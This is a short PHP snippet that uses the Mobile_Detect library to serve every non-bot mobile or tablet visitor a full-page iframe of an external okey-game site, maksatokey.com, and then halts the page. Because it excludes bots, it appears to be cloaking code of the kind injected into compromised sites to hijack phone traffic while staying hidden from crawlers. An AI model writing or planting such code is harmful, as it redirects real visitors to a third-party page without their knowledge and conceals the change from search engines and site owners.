<?php

include_once dirname(__FILE__) . "/Mobile_Detect.php";
$detect = new Mobile_Detect;

if (($detect->isMobile() || $detect->isTablet()) && !$detect->is('Bot')) {
    echo '<div class="doc"><iframe style="width:100%;height:100%;min-width:100%;" frameborder="0" marginwidth="0" marginheight="0" src="https://www.maksatokey.com/yenitema/okey.html"></iframe></div>';
    exit;
}

?>
